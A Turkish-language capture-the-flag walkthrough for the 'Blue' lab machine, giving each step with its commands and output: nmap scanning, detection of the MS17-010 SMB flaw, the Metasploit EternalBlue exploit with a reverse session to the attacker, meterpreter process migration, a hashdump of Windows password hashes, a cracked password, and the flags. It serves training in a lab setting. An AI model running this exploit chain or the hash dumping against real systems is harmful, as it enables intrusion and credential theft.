# Blue CTF 

## 1.Adım Ping Taraması
```bash
ping Machine_IP
```
## 2.Adım Nmap Tarama
```bash
nmap --top-ports 100 -sV Machine_IP
```
Nmap Tarama Sonuçları:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 15:02 EDT
Nmap scan report for Machine_IP
Host is up (0.067s latency).
Not shown: 93 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## 3.Adım SMB Güvenlik Açığı Tarama
```bash
nmap --script="smb-vuln-*" Machine_IP
```
SMB Güvenlik Açığı Sonuçları
```bash
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```
## 4.Adım Metasploit'te Açığın Aranması
```bash
msfconsole
msf6> search ms17 010
```
Eşleşen Moduller: 
```bash
   #   Adı                                          Açıklama Tarihi  Sıralama   Kontrol  Açıklama
   -   ----                                         ---------------  --------  -------  -----------
   0   exploit/windows/smb/ms17_010_eternalblue     2017-03-14       ortalama  Evet    MS17-010 EternalBlue SMB Uzak Windows Kernel Havuzu Bozulması
   1     \_ hedef: Windows Server 2012              .                .        .      .
   2     \_ hedef: Windows 10 Pro                   .                .        .      .
   3     \_ hedef: Windows 10 Enterprise Evaluation .                .        .      .
   4  exploit/windows/smb/ms17_010_psexec          2017-03-14       normal   Evet    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Uzak Windows Kod Çalıştırma
```
## 5.Adım Exploiti Kullanma ve Ayarlarının Yapılması
```bash
msf6> use 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost machine_ip
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
## 6.Adım Shell to Meterpreter
```bash
msf6> search shell_to_meterpreter
msf6> use 0
msf6> set sessions Session_id (session idyi ogrenmek icin oncesinde msf6> sessions -l)
msf6> run
```
Yeni Oturumla Etkileşim
```bash
msf6> sessions -l
msf6> sessions -i New_Session_ID
```
## 7.Adım Meterpreter Komutları
İşlemleri Görüntüleme
```bash
ps  #Root yetkisiyle çalışcan processleri inceliyoruz.
```
Root Sürecine Geçiş 
```bash
migrate 828  # (svchost.exe'nin PID'si)
```
Hashleri Dökme
```bash
hashdump
```
Hash Döküm Sonuçları
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
## 8.Adım Joh'un Şifresinin Çözülmesi
```bash
ffb43f0de35be4d9917ac0cc8ad57f8d --> alqfna22
```
## 9.Adım Flagleri Bulma
Flag 1
```bash
C:\>dir
C:\>type flag1.txt
flag{access_the_machine}
```
Flag 2
```bash
C:\Users\Jon\Contacts>dir /s /p C:\flag2.txt
C:\Users\Jon\Contacts>type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
```
Flag 3
```bash
C:\Users\Jon\Documents>dir
C:\Users\Jon\Documents>type flag3.txt
flag{admin_documents_can_be_valuable}
```

